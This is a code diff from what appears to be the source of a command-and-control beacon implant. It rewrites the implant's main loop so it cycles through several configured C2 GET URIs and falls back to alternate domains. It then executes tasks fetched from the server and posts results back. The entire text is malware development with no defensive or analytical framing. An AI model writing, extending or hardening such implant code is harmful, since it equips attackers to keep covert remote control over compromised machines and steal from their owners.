@@ -101,7 +101,20 @@ static DWORD WINAPI ObMain(LPVOID unused) {
 		if (BeaconIsExpired())
 			BeaconInterrupt();
 
-		int n = NetworkGet(S_C2_REQUEST, &gSession, data, OB_MAX_GET);
+		char uris[256];
+		strncpy(uris, S_URIS_GET, sizeof(uris) - 1);
+		uris[sizeof(uris) - 1] = 0;
+		char* usave = NULL;
+		char* uri = strtok_s(uris, ",", &usave);
+		char* urisave2 = NULL;
+		char* uriTok = strtok_s(uri, " ", &urisave2);
+		int n = -1;
+		while (uriTok != NULL) {
+			n = NetworkGet(uriTok, &gSession, data, OB_MAX_GET);
+			if (n >= 0)
+				break;
+			uriTok = strtok_s(NULL, " ", &urisave2);
+		}
 		if (n < 0) {
 			host = StrategyPickDomain(S_DOMAINS, TRUE, strategy);
 			if (host != NULL)
@@ -111,7 +124,7 @@ static DWORD WINAPI ObMain(LPVOID unused) {
 			TaskProcess(data, n);
 		}
 
-		NetworkPost(S_C2_POSTREQ);
+		NetworkPost(S_URI_POST);
 
 		int sleepMs = gSleepTime;
 		if (sleepMs > 0 && gJitter > 0) {
